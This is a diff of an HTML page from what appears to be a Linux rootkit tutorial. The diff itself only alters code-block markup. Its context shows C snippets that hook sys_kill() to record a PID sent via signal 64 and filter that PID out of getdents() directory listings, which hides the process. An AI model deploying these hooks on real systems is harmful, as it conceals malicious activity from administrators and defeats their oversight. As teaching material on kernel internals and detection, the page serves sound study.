@@ -177,7 +177,7 @@
 <h1 id="chosing-which-pid-to-hide">Chosing which PID to hide<a href="#chosing-which-pid-to-hide" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>PIDs are very unpredictable, so we don&rsquo;t want to hardcode one into our rootkit. Therefore we need to come up with a way to tell our module which PID we want to hide. The easiest way to do this is to just hook <code>sys_kill()</code> again because it&rsquo;s already built to send a PID to the kernel! We can implement a custom signal handler again (like in <a href="../linux_rootkits_03/">Part 3</a> and <a href="../linux_rootkits_05/">Part 5</a>). The only difference will be that we will write the PID passed to signal <code>64</code> into a global <code>hide_pid</code> variable, rather than just ignoring it.</p>
 <p>The hook for <code>sys_kill()</code> should look something like this (as always, I&rsquo;m only illutrating the hook that uses the more modern <code>pt_regs</code> method of calling - more info can be found in <a href="../linux_rootkits_02/">Part 2</a>):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
 </span><span style="color:#75715e"> * hide_pid will store the string representation of the PID we&#39;re hiding
 </span><span style="color:#75715e"> */</span>
 <span style="color:#66d9ef">char</span> hide_pid[NAME_MAX];
@@ -216,7 +216,7 @@ asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ho
 }
 </code></pre></div><h1 id="hiding-the-pid">Hiding The PID<a href="#hiding-the-pid" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Now that we can tell the rootkit which PID we&rsquo;d like to hide, we have to actually hide it! The way we do that is by taking the hooks for <code>sys_getdents()</code> and <code>sys_getdents64()</code> from <a href="../linux_rootkits_06">Part 6</a>, and replacing the line that compares <code>current_dir-&gt;d_name</code> to the <code>PREFIX</code> with one that compares it to <code>hide_pid</code> - see <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/7d840312deb710e28fa46dd634a60f3d182e2c9f/3_RootkitTechniques/3.5_hiding_processes/rootkit.c#L72">line 72</a> of the new <code>rootkit.c</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( (memcmp(hide_pid, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(hide_pid)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( (memcmp(hide_pid, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(hide_pid)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
         <span style="color:#f92672">&amp;&amp;</span> (strncmp(hide_pid, <span style="color:#e6db74">&#34;&#34;</span>, NAME_MAX) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) )
 {
     <span style="color:#75715e">/* Hide the directory with name in hide_pid */</span>
